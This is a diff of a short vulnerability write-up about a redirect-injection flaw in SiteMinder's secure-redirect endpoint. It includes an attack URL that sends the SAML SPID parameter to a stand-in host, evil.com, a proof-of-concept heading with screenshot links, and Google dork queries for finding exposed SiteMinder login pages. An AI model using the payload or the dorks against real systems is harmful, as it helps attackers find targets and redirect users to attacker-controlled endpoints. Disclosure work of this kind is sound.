@@ -12,12 +12,13 @@ This vulnerability is capable of injecting contents into the login form in a hid
 
 "Location: https:// {URL INJECT HERE} /affwebservices/secure/secureredirect/?SPID=https://evil.com/c2c/saml/metadata&SMPORTALURL=v%2FJaQcXcjv8i0itl6jA1r2S8TfHqIfZQoDq7oEUdb5QFATBYY04pvqJppw%2Bhp0fYSZJo gkCgh4WtuU4h7K%2BqsRXj1fSiLP1hcEFrVyXJ68piomV2582unvZkwlhmdLov&SAMLTRANSACTIONID=769a0761-7f79e2f5-35c4ace4-b9cccadc-f6d42b71-f"
 
-
-
-# Google Hacking
-
+# Proof of Concept:
 First Redirect (Secure Redirect)
-<img src="https://prnt.sc/NVJr3C5AvEE2">
+<img src="https://i.imgur.com/jQtU2XL.png">
 
 Second Redirect (After Inject)
-https://prnt.sc/9iXHGcXpVFI2
+<img src="https://i.imgur.com/WsVUBw8.png">
+
+# Google Hacking:
+intitle:"SiteMinder Password Services"
+inurl:"/siteminderagent/forms/login.fcc"
